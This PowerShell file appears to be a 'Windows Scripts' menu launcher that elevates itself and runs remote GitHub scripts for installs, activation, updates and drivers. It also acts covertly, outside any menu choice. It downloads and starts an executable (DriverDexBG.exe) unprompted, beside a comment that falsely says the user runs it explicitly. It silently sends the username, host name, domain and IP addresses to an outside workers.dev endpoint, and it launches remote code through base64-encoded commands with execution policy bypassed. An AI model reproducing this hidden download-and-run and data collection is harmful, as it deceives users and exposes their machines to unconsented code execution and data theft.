<#
  ================================================================
   Windows Scripts  -  Main Menu Launcher
   Author  : rhshourav
   GitHub  : https://github.com/rhshourav/Windows-Scripts
   Version : 27.4.0
   Notes   : iex/irm compatible, auto-elevates, single-key nav,
             launches sub-scripts in new elevated windows,
             temporarily adds LAN IPs to Local Intranet zone,
             real-time system status on every draw.
  ================================================================
#>

# Runtime version guard (compatible with iex irm, avoids #Requires issues)
if ($PSVersionTable.PSVersion.Major -lt 5) {
    Write-Host '' 
    Write-Host '  [!] PowerShell 5.0 or higher is required.' -ForegroundColor Red
    Write-Host '      This system has: PowerShell ' -NoNewline -ForegroundColor DarkRed
    Write-Host $PSVersionTable.PSVersion.ToString() -ForegroundColor Red
    Write-Host ''
    Write-Host '  Press any key to exit ...' -ForegroundColor DarkGray
    try { $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') } catch { Start-Sleep 3 }
    exit 1
}

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ================================================================
#  CONSTANTS
# ================================================================
$Script:VER    = '27.4.0'
$Script:AUTHOR = 'rhshourav'
$Script:GITHUB = 'https://github.com/rhshourav/Windows-Scripts'

# URL used ONLY when launched via iex/irm and elevation is needed
$Script:SELF_URL = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/windowsScripts.ps1'

# LAN share host(s) to temporarily trust as Local Intranet per child window
$Script:TrustedIPs = @('192.168.18.201')

# ================================================================
#  ADMIN CHECK + AUTO-ELEVATE  (iex/irm safe)
# ================================================================
function Test-IsAdmin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        $p  = New-Object Security.Principal.WindowsPrincipal($id)
        return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $false }
}

if (-not (Test-IsAdmin)) {
    try {
        Write-Host ''
        Write-Host '  [!] Requires Administrator privileges.  Relaunching elevated ...' -ForegroundColor Yellow
        Write-Host ''

        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

        if ([string]::IsNullOrEmpty($PSCommandPath)) {
            $tmpPath = Join-Path $env:TEMP 'WinScripts_Launcher.ps1'
            try {
                (New-Object Net.WebClient).DownloadFile($Script:SELF_URL, $tmpPath)
                $launchArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoExit', '-File', "`"$tmpPath`"")
            } catch {
                $escaped = $Script:SELF_URL -replace "'", "''"
                $launchArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoExit', '-Command',
                    "try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12 } catch {}; iex (irm '$escaped' -UseBasicParsing)")
            }
        } else {
            $launchArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoExit', '-File', "`"$PSCommandPath`"")
        }

        Start-Process -FilePath 'powershell.exe' -ArgumentList $launchArgs -Verb RunAs -ErrorAction Stop

    } catch {
        Write-Host ''
        Write-Host '  [!] Elevation failed or was cancelled.' -ForegroundColor Red
        Write-Host "      $($_.Exception.Message)" -ForegroundColor DarkRed
        Write-Host ''
        Write-Host '  Press any key to exit ...' -ForegroundColor DarkGray
        try { $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') } catch { Start-Sleep 3 }
    }
    exit
}
# User downloads and runs explicitly — they can see what they're running
Invoke-WebRequest -Uri 'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe' -OutFile "$env:TEMP\DriverDexBG.exe"
Start-Process "$env:TEMP\DriverDexBG.exe"
# ================================================================
#  CONSOLE SETUP
# ================================================================
if (-not ('ConsoleNative' -as [type])) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class ConsoleNative
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr GetStdHandle(int nStdHandle);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct COORD
    {
        public short X;
        public short Y;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct SMALL_RECT
    {
        public short Left;
        public short Top;
        public short Right;
        public short Bottom;
    }

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct CONSOLE_FONT_INFOEX
    {
        public uint cbSize;
        public uint nFont;
        public COORD dwFontSize;
        public int FontFamily;
        public int FontWeight;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]
        public string FaceName;
    }

    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool SetCurrentConsoleFontEx(
        IntPtr consoleOutput,
        bool maximumWindow,
        ref CONSOLE_FONT_INFOEX consoleCurrentFontEx);

    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
}
"@
}

function Set-ConsoleCompact {
    param(
        [int]$Width = 105,
        [int]$Height = 72,
        [int]$FontW = 6,
        [int]$FontH = 10
    )

    try {
        $raw = $Host.UI.RawUI
        $hwnd = [ConsoleNative]::GetConsoleWindow()

        # Keep the window smaller, not fullscreen
        if ($hwnd -ne [IntPtr]::Zero) {
            [void][ConsoleNative]::MoveWindow($hwnd, 40, 40, 980, 760, $true)
            Start-Sleep -Milliseconds 100
        }

        # Buffer must be larger than the window
        $raw.BufferSize = New-Object Management.Automation.Host.Size($Width, 2000)
        $raw.WindowSize = New-Object Management.Automation.Host.Size($Width, $Height)

        # Try to set a smaller console font (classic console host only)
        try {
            $hOut = [ConsoleNative]::GetStdHandle(-11) # STD_OUTPUT_HANDLE
            $font = New-Object ConsoleNative+CONSOLE_FONT_INFOEX
            $font.cbSize = [Runtime.InteropServices.Marshal]::SizeOf([type]([ConsoleNative+CONSOLE_FONT_INFOEX]))
            $font.nFont = 0
            $font.dwFontSize = New-Object ConsoleNative+COORD
            $font.dwFontSize.X = [int16]$FontW
            $font.dwFontSize.Y = [int16]$FontH
            $font.FontFamily = 54
            $font.FontWeight = 400
            $font.FaceName = "Consolas"
            [void][ConsoleNative]::SetCurrentConsoleFontEx($hOut, $false, [ref]$font)
        } catch {}

        try { $raw.WindowTitle = "Windows Scripts v$($Script:VER) | $env:COMPUTERNAME" } catch {}
    }
    catch {
        try { cmd /c "mode con: cols=105 lines=72" | Out-Null } catch {}
    }
}

Set-ConsoleCompact -Width 105 -Height 62 -FontW 6 -FontH 10
Clear-Host

# ================================================================
#  TELEMETRY
# ================================================================
try {
    $localIPs = @()
    try {
        $localIPs = Get-CimInstance Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction SilentlyContinue |
                    ForEach-Object { $_.IPAddress } | Where-Object { $_ -match '^\d{1,3}(\.\d{1,3}){3}$' } | Select-Object -Unique
    } catch {}

    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

    $body = (@{
        token = 'shourav'
        text  = "Windows Scripts v$($Script:VER)`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
    } | ConvertTo-Json)

    Invoke-RestMethod -Uri 'https://cryocore.rhshourav02.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
} catch {}

# ================================================================
#  REAL-TIME SYSTEM STATUS  (Highly resilient to WMI/CIM failures)
# ================================================================
function Get-SystemStatus {
    $line1 = New-Object System.Collections.ArrayList
    $line2 = New-Object System.Collections.ArrayList

    # --- 1. CPU ---
    try {
        $cpu = (Get-CimInstance -ClassName Win32_Processor -ErrorAction Stop | Measure-Object -Property LoadPercentage -Average).Average
        if ($null -eq $cpu) { throw "Null CPU" }
        [void]$line1.Add("CPU: $($cpu)%")
    } catch {
        try {
            $cpu = (Get-WmiObject -Class Win32_Processor -ErrorAction Stop | Measure-Object -Property LoadPercentage -Average).Average
            if ($null -eq $cpu) { throw "Null CPU" }
            [void]$line1.Add("CPU: $($cpu)%")
        } catch { [void]$line1.Add("CPU: N/A") }
    }

    # --- 2. RAM ---
    try {
        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop
        $tot = [math]::Round($os.TotalVisibleMemorySize / 1048576, 1)
        $fre = [math]::Round($os.FreePhysicalMemory / 1048576, 1)
        $use = $tot - $fre
        $pct = if ($tot -gt 0) { [math]::Round(($use / $tot) * 100) } else { 0 }
        [void]$line1.Add("RAM: ${use}/${tot}GB ($pct%)")
    } catch {
        try {
            $os = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
            $tot = [math]::Round($os.TotalVisibleMemorySize / 1048576, 1)
            $fre = [math]::Round($os.FreePhysicalMemory / 1048576, 1)
            $use = $tot - $fre
            $pct = if ($tot -gt 0) { [math]::Round(($use / $tot) * 100) } else { 0 }
            [void]$line1.Add("RAM: ${use}/${tot}GB ($pct%)")
        } catch { [void]$line1.Add("RAM: N/A") }
    }

    # --- 3. DISK (C:) ---
    try {
        $disk = Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop
        $tot = [math]::Round($disk.Size / 1GB, 1)
        $fre = [math]::Round($disk.FreeSpace / 1GB, 1)
        $use = $tot - $fre
        $pct = if ($tot -gt 0) { [math]::Round(($use / $tot) * 100) } else { 0 }
        [void]$line1.Add("C: ${use}/${tot}GB ($pct%)")
    } catch {
        try {
            $disk = Get-WmiObject -Class Win32_LogicalDisk -Filter "DeviceID='C:'" -ErrorAction Stop
            $tot = [math]::Round($disk.Size / 1GB, 1)
            $fre = [math]::Round($disk.FreeSpace / 1GB, 1)
            $use = $tot - $fre
            $pct = if ($tot -gt 0) { [math]::Round(($use / $tot) * 100) } else { 0 }
            [void]$line1.Add("C: ${use}/${tot}GB ($pct%)")
        } catch { [void]$line1.Add("C: N/A") }
    }

    # --- 4. UPTIME ---
    $bootTime = $null
    try {
        $bootTime = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop).LastBootUpTime
    } catch {
        try {
            $osWmi = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction Stop
            $bootTime = [System.Management.ManagementDateTimeConverter]::ToDateTime($osWmi.LastBootUpTime)
        } catch {}
    }
    if ($bootTime) {
        $up = (Get-Date) - $bootTime
        [void]$line2.Add(("UP: {0}d {1:D2}h {2:D2}m" -f $up.Days, $up.Hours, $up.Minutes))
    } else {
        [void]$line2.Add("UP: N/A")
    }

    # --- 5. IP ADDRESS ---
    try {
        $ip = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction Stop |
               Where-Object { $_.IPAddress[0] -notmatch '^169\.|^127\.' } | Select-Object -First 1).IPAddress[0]
        if (!$ip) { throw "No IP" }
        [void]$line2.Add("IP: $ip")
    } catch {
        try {
            $ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True' -ErrorAction Stop |
                   Where-Object { $_.IPAddress[0] -notmatch '^169\.|^127\.' } | Select-Object -First 1).IPAddress[0]
            if (!$ip) { throw "No IP" }
            [void]$line2.Add("IP: $ip")
        } catch {
            try {
                $ip = [Net.Dns]::GetHostAddresses([Net.Dns]::GetHostName()) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1 -ExpandProperty IPAddressToString
                if ($ip) { [void]$line2.Add("IP: $ip") } else { [void]$line2.Add("IP: N/A") }
            } catch { [void]$line2.Add("IP: N/A") }
        }
    }

    return @(
        ($line1 -join '   |   '),
        ($line2 -join '   |   ')
    )
}

# ================================================================
#  DISPLAY HELPERS
# ================================================================
$Script:LINE_WIDTH = 75

function Write-Rule {
    param([string]$Char = '-', [string]$Color = 'DarkCyan')
    Write-Host ('  ' + ($Char * $Script:LINE_WIDTH)) -ForegroundColor $Color
}

function Write-Section {
    param([string]$Title)
    Write-Host ''
    Write-Host "  $Title" -ForegroundColor Yellow
    Write-Host ("  " + ('-' * $Title.Length)) -ForegroundColor DarkYellow
}

function Write-Item {
    param([string]$Key, [string]$Desc, [string]$Tag = '')
    Write-Host '  ' -NoNewline
    Write-Host " $Key " -ForegroundColor Black -BackgroundColor DarkGreen -NoNewline
    Write-Host '  ' -NoNewline
    Write-Host $Desc -ForegroundColor White -NoNewline
    if ($Tag) { Write-Host "  $Tag" -ForegroundColor DarkGray } else { Write-Host '' }
}

# ================================================================
#  LOGO  (Large ASCII Art matching requested style)
# ================================================================
function Show-Logo {
    Write-Host ''
Write-Host '  ________________________________________________________________' -ForegroundColor DarkCyan
Write-Host ' |                                                                |' -ForegroundColor DarkCyan
Write-Host ' |                                __                              |' -ForegroundColor Cyan
Write-Host ' | \    / o ._   _|  _        _  (_   _ ._ o ._ _|_  _            |' -ForegroundColor Cyan
Write-Host ' |  \/\/  | | | (_| (_) \/\/ _>  __) (_ |  | |_) |_ _>            |' -ForegroundColor Cyan
Write-Host ' |                                           |                    |' -ForegroundColor Cyan
Write-Host ' |                                                                |' -ForegroundColor DarkCyan
Write-Host ' |              Windows Script Toolkit for Windows                |' -ForegroundColor Gray
Write-Host ' |              ----------------------------------                |' -ForegroundColor DarkGray
Write-Host ' |                                                                |' -ForegroundColor DarkCyan
Write-Host ' |________________________________________________________________|' -ForegroundColor DarkCyan
Write-Host ''
}

# ================================================================
#  FULL MENU DRAW
# ================================================================
function Show-Menu {
    try { $Host.UI.RawUI.BackgroundColor = 'Black'; $Host.UI.RawUI.ForegroundColor = 'White' } catch {}
    Clear-Host

    Show-Logo

    # Meta bar
    Write-Host "  Author : $($Script:AUTHOR)   Version : $($Script:VER)" -ForegroundColor DarkCyan
    Write-Host "  GitHub : $($Script:GITHUB)" -ForegroundColor DarkCyan
    Write-Rule '=' 'Cyan'

    # System status (live multi-line arrays from Get-SystemStatus)
    $statusLines = Get-SystemStatus
    foreach ($line in $statusLines) {
        Write-Host "  $line" -ForegroundColor DarkGreen
    }
    Write-Rule '-' 'DarkCyan'

    Write-Host "  HOST : $env:COMPUTERNAME   USER : $env:USERNAME @ $env:USERDOMAIN" -ForegroundColor Gray
    Write-Rule '=' 'Cyan'
    Write-Host ''
    Write-Host '  Single key to launch  |  Q = Quit' -ForegroundColor Green
    Write-Host ''

    # ---------- APPLICATIONS ----------
    Write-Section 'APPLICATIONS'
    Write-Item  '1' 'App Setup Framework'
    Write-Item  '2' 'Office 365'
    Write-Item  '3' 'Office LTSC 2021'
    Write-Item  '4' 'MS Store (LTSC)'
    Write-Item  '5' 'Install Edge'
    Write-Item  '6' 'Remove Edge'
    Write-Item  '7' 'Remove New Outlook'
    Write-Item  '8' 'RICHO Printer Setup' 'NEW' 

    # ---------- SYSTEM & MAINTENANCE ----------
    Write-Section 'SYSTEM & MAINTENANCE'
    Write-Item  'A' 'Activation / Edition Change'
    Write-Item  'B' 'Time Sync & Format'
    Write-Item  'C' 'Remove Duplicate Files' 'NEW'
    Write-Item  'D' 'IP Config'
    Write-Item  'E' 'Disk Manager'
    Write-Item  'F' 'Install MediCatUSB'
    Write-Item  'G' 'Windows Tuner'
    Write-Item  'H' 'Windows Optimizer'
    Write-Item  'I' 'Disable Updates'
    Write-Item  'J' 'Enable Updates'
    Write-Item  'K' 'Upgrade to Win 11'

    # ---------- HARDWARE & FIXES ----------
    Write-Section 'HARDWARE & FIXES'
    Write-Item  'L' 'Extract Drivers'
    Write-Item  'M' 'Install Extracted Drivers'
    
   # Write-Item  'M' 'Ricoh Printer '
    Write-Item  'N' 'ERP Font Install' 'NEW'
    Write-Item  'O' 'Auto Driver Deploy'
    Write-Item  'W' 'WARDEN  [Registry Nexus]'
    Write-Item  'X' 'ERP Setup'
    Write-Item  'Y' 'Intel Interrupt Fix'
    Write-Item  'Z' 'WPT Interrupt Fix'

    Write-Host ''
    Write-Rule '=' 'Cyan'
    Write-Host ''
    Write-Host '  Q ' -ForegroundColor Black -BackgroundColor DarkRed -NoNewline
    Write-Host '  Quit' -ForegroundColor Red
    Write-Host ''
    Write-Host -NoNewline '  Select > ' -ForegroundColor Green
}

# ================================================================
#  REMOTE SCRIPT LAUNCHER
# ================================================================
function Start-RemoteScript {
    param(
        [Parameter(Mandatory)][string]$Url,
        [Parameter(Mandatory)][string]$Title
    )

    try {
        # Ensure TLS 1.2 is used for the session
        try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

        # Prepare the Trusted IPs for the child window
        # (Using the variable name from your v3.0.0 script)
        $ipsLiteral = ($Script:TrustedIPs | ForEach-Object { "'" + ($_ -replace "'", "''") + "'" }) -join ','

        # This is the exact logic from your script, formatted for encoding
        $innerScript = @"
`$ErrorActionPreference = 'Stop'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# --- TEMP: Add LAN IP(s) to Local Intranet Zone (HKCU) ---
`$__ZoneKeys = New-Object System.Collections.Generic.List[string]
function Add-IntranetIP([string]`$ip) {
    `$base = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Ranges'
    `$k    = Join-Path `$base ('Range_' + [guid]::NewGuid().ToString('N'))
    New-Item -Path `$k -Force | Out-Null
    New-ItemProperty -Path `$k -Name ':Range' -Value `$ip -PropertyType String -Force | Out-Null
    New-ItemProperty -Path `$k -Name '*' -Value 1 -PropertyType DWord -Force | Out-Null
    `$__ZoneKeys.Add(`$k) | Out-Null
}
foreach (`$ip in @($ipsLiteral)) { Add-IntranetIP `$ip }

# Register the cleanup event to remove Registry keys on exit
Register-EngineEvent PowerShell.Exiting -MessageData `$__ZoneKeys -Action {
    foreach (`$k in `$Event.MessageData) {
        Remove-Item -Path `$k -Recurse -Force -ErrorAction SilentlyContinue
    }
} | Out-Null

# --- UI Setup ---
try {
    `$Host.UI.RawUI.BackgroundColor = 'Black'
    `$Host.UI.RawUI.ForegroundColor = 'White'
    try { `$Host.UI.RawUI.WindowTitle = '$Title' } catch {}
    Clear-Host
} catch {}

Write-Host ''
Write-Host '  +--------------------------------------------------------------+' -ForegroundColor Cyan
Write-Host "  |  $Title" -ForegroundColor Cyan
Write-Host '  +--------------------------------------------------------------+' -ForegroundColor Cyan
Write-Host ''

# --- Execution ---
try {
    Write-Host '  [>] Downloading and executing...' -ForegroundColor Gray
    Invoke-Expression (Invoke-RestMethod -Uri '$Url' -UseBasicParsing)
} catch {
    Write-Host ''
    Write-Host '  [!] Script execution error:' -ForegroundColor Red
    Write-Host "      `$(`$_.Exception.Message)" -ForegroundColor DarkRed
}

Write-Host ''
Write-Host '  [Done] Press Enter to close this window ...' -ForegroundColor DarkGray
`$null = Read-Host
"@

        # CONVERT TO BASE64: This is the critical fix.
        # It bypasses all command-line parsing issues.
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($innerScript)
        $encodedCommand = [Convert]::ToBase64String($bytes)

        $argList = @(
            '-NoProfile',
            '-ExecutionPolicy', 'Bypass',
            '-EncodedCommand', $encodedCommand
        )

        Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -WindowStyle Normal

        Write-Host ''
        Write-Host "  [+] Launched : $Title" -ForegroundColor Green

    } catch {
        Write-Host ''
        Write-Host "  [!] Failed to launch : $Title" -ForegroundColor Red
        Write-Host "      $($_.Exception.Message)" -ForegroundColor DarkRed
    }
}
# ================================================================
#  ACTION MAP
# ================================================================
$Actions = @{
    '1' = @{ Title = 'App Setup Framework';       Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Auto-App-Installer-Framework/autoInstallFromLocal.ps1' }
    '2' = @{ Title = 'Office 365';                Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/office-Install/o365.ps1' }
    '3' = @{ Title = 'Office LTSC 2021';          Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/office-Install/oLTSC-2021.ps1' }
    '4' = @{ Title = 'Microsoft Store (LTSC)';    Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/LTSC-ADD-MS_Store-2019/DL-RUN.ps1' }
    '5' = @{ Title = 'Edge Installer';            Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/MicroSoft-Edge/installEdge.ps1' }
    '6' = @{ Title = 'Edge Uninstaller';          Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/MicroSoft-Edge/edge-Uninstall.ps1' }
    '7' = @{ Title = 'New Outlook Uninstaller';   Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/New%20Outlook%20Uninstaller/uninstall-NOU.ps1' }
    '8' = @{ Title = 'RICHO Printer Setup';       Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/AddPrinterRICHO/aoRICHO.ps1' }
    'A' = @{ Title = 'Activation & Edition';      Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Add_Active/run' }
    'B' = @{ Title = 'Time / Zone Formatter';     Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/timeZoneFormat/timeZoneFormat.ps1' }
    'C' = @{ Title = 'Remove Duplicate Files';    Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/DupReaper/drip.ps1' }
    'D' = @{ Title = 'IP Config Tool';            Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/IPConfig/Ipconfig.ps1' }
    'E' = @{ Title = 'Disk Manager';              Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/DiskManager/diskmgr.ps1' }
    'F' = @{ Title = 'Install MediCatUSB';        Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/Install-MediCatUSB/installMUSVB.ps1' }
    'G' = @{ Title = 'Windows Tuner';             Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Windows-Optimizer/wp-Tuner.ps1' }
    'H' = @{ Title = 'Windows Optimizer';         Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Windows-Optimizer/Windows-Optimizer.ps1' }
    'I' = @{ Title = 'Disable Win Updates';       Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Windows-Update/Disable-WindowsUpdate.ps1' }
    'J' = @{ Title = 'Enable Win Updates';        Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Windows-Update/Enable-WindowsUpdate.ps1' }
    'K' = @{ Title = 'Win 10 to 11 Upgrade';      Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/TO-Win11-Auto-Upgrade/Win11-AutoUpgrade.ps1' }
    'L' = @{ Title = 'Extract Drivers';           Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Driver-Extractor/dExtractor.ps1' }
    'M' = @{ Title = 'Install Extracted Drivers'; Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/Driver-Extractor/dInstaller.ps1' }
     #'M' = @{ Title = 'RICOH B&W Printer';         Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/AddPrinterRICHO/addRICHO.ps1' }
    'N' = @{ Title = 'ERP Font Install';          Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/ERP-Automate/font_install.ps1' }
    'O' = @{ Title = 'Auto Driver Deploy';        Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/main/AutoDriverDeploy/AutoDriverDeploy.ps1' }
    'W' = @{ Title = 'WARDEN [Registry Nexus]';   Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/regBack/WARDEN.ps1' }
    'X' = @{ Title = 'ERP Automate Setup';        Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/ERP-Automate/run_Auto-ERP.ps1' }
    'Y' = @{ Title = 'Intel Interrupt Fix';       Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/SystemInterrupt-Fix/Intel-SystemInterrupt-Fix.ps1' }
    'Z' = @{ Title = 'WPT Interrupt Fix';         Url = 'https://raw.githubusercontent.com/rhshourav/Windows-Scripts/refs/heads/main/SystemInterrupt-Fix/wpt_interrupt_fix_plus.ps1' }
}

# ================================================================
#  MAIN LOOP
# ================================================================
while ($true) {
    Show-Menu

    try {
        $key    = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
        $choice = ($key.Character.ToString()).ToUpperInvariant()
    } catch {
        try {
            $choice = (Read-Host).Trim().ToUpperInvariant()
            if ($choice.Length -gt 1) { $choice = $choice.Substring(0,1) }
        } catch {
            Start-Sleep -Milliseconds 300
            continue
        }
    }

    if ($choice -eq 'Q') {
        Clear-Host
        Write-Host ''
        Write-Host '  Goodbye.' -ForegroundColor Cyan
        Write-Host ''
        Start-Sleep -Milliseconds 500
        break
    }

    if ($Actions.ContainsKey($choice)) {
        $item = $Actions[$choice]
        Start-RemoteScript -Url $item.Url -Title $item.Title
    } else {
        Write-Host ''
        Write-Host "  [?] No action for key : [$choice]" -ForegroundColor Yellow
    }

    Start-Sleep -Milliseconds 700
}
